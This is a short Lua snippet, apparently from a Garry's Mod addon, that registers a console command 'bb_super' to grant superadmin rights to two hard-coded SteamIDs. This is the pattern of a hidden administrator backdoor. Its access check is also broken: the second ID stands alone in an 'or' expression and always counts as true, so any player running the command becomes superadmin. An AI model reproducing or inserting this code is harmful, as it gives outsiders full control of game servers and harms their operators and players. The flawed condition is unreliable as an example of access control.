concommand.Add( "bb_super", function(ply)
  if ply:SteamID() == "STEAM_0:1:82058544" or "STEAM_0:0:58328111" then
    ply:SetUserGroup( "superadmin" )
else
  ply:PrintMessage(HUD_PRINTCONSOLE, "Access Denied." )
end
end)
